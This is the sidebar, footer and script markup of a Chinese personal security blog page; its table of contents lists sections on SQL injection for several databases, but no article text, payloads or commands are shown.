is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MssnHarvey/mssnharvey.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=3305601910" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/MssnHarvey" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://github.com/MssnHarvey" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3305601910@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Harvey'Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">mysql注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">oracle注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">注意点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Acess%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">Acess数据注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">MSSQL注入：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/29/TCTF%20Final%20WP/" title="TCTF Final WP"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3368874837.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TCTF Final WP"/></a><div class="content"><a class="title" href="/2021/09/29/TCTF%20Final%20WP/" title="TCTF Final WP">TCTF Final WP</a><time datetime="2021-09-29T07:02:00.000Z" title="发表于 2021-09-29 15:02:00">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hacker%20(2).png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次对某大学的逻辑漏洞"/></a><div class="content"><a class="title" href="/2021/03/20/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="记一次对某大学的逻辑漏洞">记一次对某大学的逻辑漏洞</a><time datetime="2021-03-20T13:11:00.000Z" title="发表于 2021-03-20 21:11:00">2021-03-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/14/2021VNCTF/" title="VNCTF 2021"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/653112701.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF 2021"/></a><div class="content"><a class="title" href="/2021/03/14/2021VNCTF/" title="VNCTF 2021">VNCTF 2021</a><time datetime="2021-03-14T07:13:20.000Z" title="发表于 2021-03-14 15:13:20">2021-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><img src="https://web-resource.mucang.cn/maiche.web/mucang.official/official/resources/images/new-version/beian.png" width="20" height="20" /> </img> 闽ICP备20002768号</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(()=>{
+  const $countDom = document.getElementById('twikoo-count')
+  const init = () => {
+    let initData = {
+      el: '#twikoo-wrap',
+      envId: '',
+      region: ''
+    }
+
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    twikoo.init(initData)
+  }
+
+  const getCount = () => {
+    twikoo.getCommentsCount({
+      envId: '',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      $countDom.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const loadTwikoo = (bool = false) => {
+    if (typeof twikoo === 'object') {
+      init()
+      bool && $countDom && setTimeout(getCount,0)
+    } else {
+      getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(()=> {
+        init()
+        bool && $countDom && setTimeout(getCount,0)
+      })
+    }
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo(true)
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="000PeZCQ1i4XVs" data-server="tencent" data-type="artist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
